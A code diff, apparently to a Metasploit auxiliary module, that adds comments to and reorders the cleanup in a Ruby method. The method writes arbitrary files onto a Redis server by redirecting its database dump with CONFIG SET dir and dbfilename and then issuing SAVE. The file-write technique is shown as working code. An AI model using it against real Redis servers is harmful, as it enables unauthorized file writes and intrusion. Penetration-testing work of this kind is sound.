@@ -40,6 +40,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def send_file(path, content)
+    # XXX: refactor this to handle redis errors or exceptions in a cleaner manner
+
     dirname = File.dirname(path)
     basename = File.basename(path)
 
@@ -49,26 +51,27 @@ class Metasploit3 < Msf::Auxiliary
     original_dir = send_redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
     original_dbfilename = send_redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
 
+    # set the directory which stores the current redis local store
     data = send_redis_command('CONFIG', 'SET', 'dir', dirname)
     return unless data.include?('+OK')
 
+    # set the file name, relative to the above directory name, that is the redis local store
     data = send_redis_command('CONFIG', 'SET', 'dbfilename', basename)
     return unless data.include?('+OK')
 
+    # set a key in this db that contains our content
     key = Rex::Text.rand_text_alpha(32)
     data = send_redis_command('SET', key, content)
-
     return unless data.include?('+OK')
-
     data = send_redis_command('SAVE')
     return unless data.include?('+OK')
     print_good("#{peer} -- saved file to #{path}")
 
-    data = send_redis_command('DEL', key)
     # cleanup
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
     send_redis_command('CONFIG', 'SET', 'dir', original_dir)
     send_redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
+    send_redis_command('DEL', key)
     send_redis_command('SAVE')
   end
 
